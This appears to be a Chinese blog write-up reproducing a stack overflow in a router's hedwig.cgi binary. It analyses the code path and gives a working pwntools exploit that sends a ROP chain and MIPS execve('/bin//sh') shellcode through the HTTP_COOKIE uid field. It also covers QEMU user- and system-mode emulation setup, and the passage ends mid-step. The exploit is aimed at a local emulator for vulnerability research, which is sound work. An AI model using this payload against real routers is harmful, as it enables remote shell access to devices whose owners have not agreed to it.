<p><img src="https://s2.loli.net/2025/06/25/9EP8C5nbxw1kN2s.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/mdaJZQGRfqxINB5.png" alt="image" loading="lazy"></p>
<p>然后就是劫持程序流程，但实际上还需要绕过，也不是说绕过，参考正常pwn栈溢出的思路，我们肯定需要让程序执行完，然后才能执行到我们布置的rop链上，如何让程序能正常去执行</p>
<p>后续有两个要求</p>
<p>1.&#x2F;var&#x2F;tmp&#x2F;temp.xml存在</p>
<p>2.haystack !&#x3D; null</p>
<p>第一个只要我们不去破坏程序环境就不会出问题</p>
<p>关键是第二个，通过交叉引用我们发现控制haystack值的地方</p>
<p>这里实际上有两种处理方式，因为目的就是让程序走到我们的gadget上</p>
<p><code>1.CONTENT_TYPE=application/x-www-form-urlencoded</code>​</p>
<p>也是网上很多师傅分析的</p>
<p><img src="https://s2.loli.net/2025/06/25/Dw9IW2u7yEFzphx.png" alt="image" loading="lazy"></p>
<p>sub_409a6c</p>
<p>每当cgibin_parse_request解析到一段需要处理的数据时，就会调用sub_409A6C，把数据交给它处理。这样，haystack就始终保存着最新的请求数据内容</p>
<p>正常执行的话haystack是不为空的</p>
<p><img src="https://s2.loli.net/2025/06/25/Fz97VW3J2osjtch.png" alt="image" loading="lazy"></p>
<p>之后就是获取两个环境变量，REQUEST_URI&#x2F;CONTENT_LENGTH</p>
<p><img src="https://s2.loli.net/2025/06/25/OR49Ba82KVeoWk1.png" alt="image" loading="lazy"></p>
<p>主要是CONTENT_TYPE，会检测”application&#x2F;“这个字符串，同时会跳转到一个地方，ida中是看不到的，我们可以下断点调试看看</p>
<p><img src="https://s2.loli.net/2025/06/25/iTPwgZ4tdMxH6Uq.png" alt="image" loading="lazy"></p>
<p>这里返回的是0x403b10</p>
<p><img src="https://s2.loli.net/2025/06/25/OtCNcwfEqjxevDS.png" alt="image" loading="lazy"></p>
<p>0x403b10</p>
<p><img src="https://s2.loli.net/2025/06/25/OaSB1Aeinbys27d.png" alt="image" loading="lazy"></p>
<p>然后还是返回到0x409a6c，需要保证REQUEST_URI存在，然后程序就可以返回到我们布置好的rop上getshell</p>
<p><img src="https://s2.loli.net/2025/06/25/6NthXGRgPoWkmq1.png" alt="image" loading="lazy"></p>
<p>‍</p>
<p><img src="https://s2.loli.net/2025/06/25/jXNTEeFgmsRuVq3.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/tQCJhLwnicBfbMV.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/N8qlbJ4EGxBaOjW.png" alt="image" loading="lazy"></p>
<p>实际上我们可以<code>CONTENT_TYPE=任意</code>​，仅需设置post传参其他参数都不用控制,这样岂不是更简单</p>
<p>在sub_403B10不进入sub_402FFC,而是往下走，最后到sub_403794-&gt;cgibin_print_http_status</p>
<p>此时程序也可以走完，同时不触发报错，可以利用栈溢出漏洞，栈溢出的偏移不一样罢了</p>
<p><img src="https://s2.loli.net/2025/06/25/p15ULvBMFEmdVwJ.png" alt="image" loading="lazy"></p>
<p><img src="https://s2.loli.net/2025/06/25/yPhiwu59nTZzDIq.png" alt="image" loading="lazy"></p>
<p>偏移</p>
<p><img src="https://s2.loli.net/2025/06/25/bWHFCARkmw8GtMh.png" alt="image" loading="lazy"></p>
<p>poc:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;--&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch=&#x27;mips&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(target=(&quot;127.0.0.1&quot;, 1234), exe=&quot;./htdocs/cgibin&quot;,</span><br><span class="line">               gdbscript=&quot;&quot;&quot;</span><br><span class="line">               b *0x409680\n    </span><br><span class="line">               c\n</span><br><span class="line">               &quot;&quot;&quot;)</span><br><span class="line">    pause()</span><br><span class="line">def s(a):</span><br><span class="line">	p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">	p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">	p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">	p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">	p.recv(a)</span><br><span class="line">def rl(a):</span><br><span class="line">	return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">libc_base = 0x7f738000#local</span><br><span class="line">#libc_base = 0x77f34000 #remote</span><br><span class="line">payload=cyclic(0x1000)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27;*0x3cd</span><br><span class="line">payload += b&#x27;a&#x27;*(4+0x18+12-2)</span><br><span class="line">payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span><br><span class="line">payload += b&#x27;abcd&#x27;</span><br><span class="line">payload += p32(libc_base + 0x56BD0) # s3  sleep</span><br><span class="line">payload += cyclic(20)#b&#x27;a&#x27;*(4*5)</span><br><span class="line">payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=&gt; jalr $s1)</span><br><span class="line"> </span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += b&#x27;a&#x27;*(4*4)</span><br><span class="line">payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=&gt; jalr $t9)</span><br><span class="line">payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span><br><span class="line"> </span><br><span class="line">shellcode = asm(&#x27;&#x27;&#x27;</span><br><span class="line">    slti $a2, $zero, -1</span><br><span class="line">    li $t7, 0x69622f2f</span><br><span class="line">    sw $t7, -12($sp)</span><br><span class="line">    li $t6, 0x68732f6e</span><br><span class="line">    sw $t6, -8($sp)</span><br><span class="line">    sw $zero, -4($sp)</span><br><span class="line">    la $a0, -12($sp)</span><br><span class="line">    slti $a1, $zero, -1</span><br><span class="line">    li $v0, 4011</span><br><span class="line">    syscall 0x40404</span><br><span class="line">&#x27;&#x27;&#x27;)</span><br><span class="line">payload += b&#x27;a&#x27;*0x18</span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;uid=&quot; + payload</span><br><span class="line">post_content = &quot;Thir0th=Pwner&quot;</span><br><span class="line">p = process(b&quot;&quot;&quot;</span><br><span class="line">    qemu-mipsel -L ./ \</span><br><span class="line">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\&quot; \</span><br><span class="line">    -g 1234 ./htdocs/cgibin</span><br><span class="line">&quot;&quot;&quot;, shell = True)</span><br><span class="line"></span><br><span class="line">bug()</span><br><span class="line">p.send(post_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‍</p>
<p><img src="https://s2.loli.net/2025/06/25/e8sy2A41lq5aMwK.png" alt="image" loading="lazy"></p>
<p>‍</p>
<h2 id="qemu用户态模拟"><a href="#qemu用户态模拟" class="headerlink" title="qemu用户态模拟"></a>qemu用户态模拟</h2><p>这个比较简单，就跟本地调试异架构一样，但参数不一样</p>
<h3 id="直接gdb调试"><a href="#直接gdb调试" class="headerlink" title="直接gdb调试"></a>直接gdb调试</h3><p>进入 <code>squashfs-root</code>​ 文件夹中，执行下列指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic 2000 &gt; payload</span><br></pre></td></tr></table></figure>

<p>init.sh脚本启动</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">INPUT=&quot;Thir0th=Pwner&quot;                       # 要发送的 POST 数据（可能是伪造登录</span><br><span class="line">或命令执行尝试）</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)         # 自动计算数据长度（Content-Length）</span><br><span class="line">COOKIE=&quot;uid=`cat payload`&quot;              # 从 payload 文件读取 cookie uid（模拟登</span><br><span class="line">录身份）</span><br><span class="line"></span><br><span class="line"># 使用 qemu-mipsel 启动 CGI 程序（绑定 GDB 调试端口 1234）</span><br><span class="line">echo $INPUT | qemu-mipsel -L ./ \</span><br><span class="line">  -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">  -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">  -E CONTENT_LENGTH=$LEN \</span><br><span class="line">  -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">  -E HTTP_COOKIE=$COOKIE \</span><br><span class="line">  -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="line">  -g 1234 \</span><br><span class="line">  ./htdocs/cgibin</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>mygdb.sh</p>
<p>gdb-multiarch -x mygdb.sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips                                     </span><br><span class="line">set follow-fork-mode child  </span><br><span class="line">set detach-on-fork off                                    </span><br><span class="line">target remote 127.0.0.1:1234</span><br><span class="line">file ./htdocs/cgibin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‍</p>
<h3 id="脚本调试"><a href="#脚本调试" class="headerlink" title="脚本调试"></a>脚本调试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;--&#x27;, &#x27;bash&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch=&#x27;mips&#x27;</span><br><span class="line">context.os=&#x27;linux&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(target=(&quot;127.0.0.1&quot;, 1234), exe=&quot;./htdocs/cgibin&quot;,</span><br><span class="line">               gdbscript=&quot;&quot;&quot;</span><br><span class="line">               b *0x402FFC\n    </span><br><span class="line">               c\n</span><br><span class="line">               &quot;&quot;&quot;)</span><br><span class="line">    pause()</span><br><span class="line">def s(a):</span><br><span class="line">	p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">	p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">	p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">	p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">	p.recv(a)</span><br><span class="line">def rl(a):</span><br><span class="line">	return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&quot;uid=&quot; + payload</span><br><span class="line">post_content = &quot;Thir0th=Pwner&quot;</span><br><span class="line">p = process(b&quot;&quot;&quot;</span><br><span class="line">    qemu-mipsel -L ./ \</span><br><span class="line">    -0 &quot;hedwig.cgi&quot; \</span><br><span class="line">    -E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">    -E CONTENT_LENGTH=10 \</span><br><span class="line">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">    -E HTTP_COOKIE=\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\&quot; \</span><br><span class="line">    -E REQUEST_URI=&quot;2333&quot; \</span><br><span class="line">    -g 1234 ./htdocs/cgibin</span><br><span class="line">&quot;&quot;&quot;, shell = True)</span><br><span class="line"></span><br><span class="line">bug()</span><br><span class="line">p.send(post_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()	</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="qemu系统态模拟"><a href="#qemu系统态模拟" class="headerlink" title="qemu系统态模拟"></a>qemu系统态模拟</h2><h3 id="step1-下载对应内核-镜像"><a href="#step1-下载对应内核-镜像" class="headerlink" title="step1 下载对应内核+镜像"></a>step1 下载对应内核+镜像</h3><p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">Index of &#x2F;~aurel32&#x2F;qemu&#x2F;mipsel</a></p>
<p><img src="https://s2.loli.net/2025/06/25/njFp7cTJSz1YeVE.png" alt="image" loading="lazy"></p>
<h3 id="step2-创建网桥"><a href="#step2-创建网桥" class="headerlink" title="step2 创建网桥"></a>step2 创建网桥</h3><p>安装网络配置器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils uml-utilities</span><br></pre></td></tr></table></figure>

<p>修改interfaces文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<p>修改之前可以先备份</p>
<p><code>sudo cp /etc/network/interfaces /etc/network/interfaces.brk</code>​</p>
<p>修改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line"> </span><br><span class="line">auto ens33</span><br><span class="line">iface ens33 inet dhcp</span><br><span class="line">up ifconfig ens33 0.0.0.0 up</span><br><span class="line"> </span><br><span class="line">auto br0</span><br><span class="line">iface br0 inet dhcp</span><br><span class="line"> </span><br><span class="line">bridge_ports ens33</span><br><span class="line">bridge_maxwait 0</span><br></pre></td></tr></table></figure>

<p>在 <code>/etc/qemu-ifup</code>​ 文件中写入下面内容(如果没有则需要创建，然后使用 <code>sudo chmod a+x /etc/qemu-ifup</code>​)<br>注意是<code>写入</code>​，<code>不是</code>​改成下面内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo &quot;Executing /etc/qemu-ifup&quot;</span><br><span class="line">echo &quot;Bringing up $1 for bridge mode...&quot;</span><br><span class="line">sudo /sbin/ifconfig $1 0.0.0.0 promisc up</span><br><span class="line">echo &quot;Adding $1 to br0...&quot;</span><br><span class="line">sudo /sbin/brctl addif br0 $1</span><br><span class="line">sleep 2</span><br></pre></td></tr></table></figure>

<p>开启物理机的转发功能</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>然后在到<code>/etc</code>​文件中创建一个 <code>/qemu/bridge.conf</code>​ 在这个文件中写入 <code>allow br0</code>​</p>
<p>配置好之后reboot</p>
<h3 id="step3-配置qemu网络"><a href="#step3-配置qemu网络" class="headerlink" title="step3 配置qemu网络"></a>step3 配置qemu网络</h3><p>qemu启动脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># start.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic,macaddr=00:16:3e:00:00:01 \</span><br><span class="line">    -net tap</span><br></pre></td></tr></table></figure>

<p>将start.sh与下载的内核+镜像放置在一起，启动qemu</p>
<p>账号密码都是root</p>
<p>执行后会出现一个黑色小窗口，然后里面在加载程序，最后可能会有一个 <code>fail</code>​ 但是不要紧，不影响我们复现漏洞，太多 <code>fail</code>​ 可能就有点问题了需要问AI检查一下</p>
<p><code>nano</code>​ 来修改 <code>/etc/network/interfaces</code>​</p>
<p>将eth0改为eth1，（ip -a查看一下qemu网卡，不一定是eth1）</p>
<p><img src="https://s2.loli.net/2025/06/25/Pk1n74aKVmFojlc.png" alt="image" loading="lazy"></p>
<p>启用eth1接口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifup eth1</span><br></pre></td></tr></table></figure>

<p>之后执行ip -a就可以看到qemu的ip了</p>
<p>互ping，检测是否互通，按照上述步骤来是没问题的</p>
<p>在qemu中输入应该不方便，可以用ssh链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 低版本Ubutnu</span><br><span class="line">ssh root@192.168.xx.xx</span><br><span class="line"></span><br><span class="line"># 高版本Ubutnu</span><br><span class="line">ssh -o HostKeyAlgorithms=ssh-rsa root@192.168.xx.xx</span><br></pre></td></tr></table></figure>

<p>step4 启动环境</p>
<p>将路由器文件分解得到的 <code>/squashfs-root</code>​ 文件传入到 qemu虚拟机的 <code>/root</code>​ 文件夹下面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 低版本Ubutnu</span><br><span class="line">scp -r ./squashfs-root root@192.168.xx.xx:/root/</span><br><span class="line">scp -r &lt;本地Ubuntu文件地址&gt; root@192.168.xx.xx:&lt;qemu虚拟机文件地址&gt;</span><br><span class="line"></span><br><span class="line"># 高版本Ubuntu</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r ./squashfs-root root@192.168.xx.xx:/root/</span><br><span class="line">scp -o HostKeyAlgorithms=ssh-rsa -r &lt;本地Ubuntu文件地址&gt; root@192.168.xx.xx:&lt;qemu虚拟机文件地址&gt;</span><br></pre></td></tr></table></figure>

<p><code>/squashfs-root</code>​ 文件中使用 <code>nano指令</code>​ 创建一个 <code>http_conf</code>​ 文件用于开启httpd服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  #开启log</span><br><span class="line">ErrorLog /log #log文件</span><br><span class="line"> </span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth1                          #对应qemu仿真路由器系统的网卡(如果是按照上面操作来的话就不用改)</span><br><span class="line">    Address 192.168.xx.xx                   #qemu仿真路由器系统的IP(需要改成自己的qemu虚拟机ip地址)</span><br><span class="line">    Port &quot;1234&quot;                             #对应未被使用的端口(一般也是不用改)</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /</span><br><span class="line">            Location /htdocs/web</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>qemu执行以下脚本，启动web服务</p>
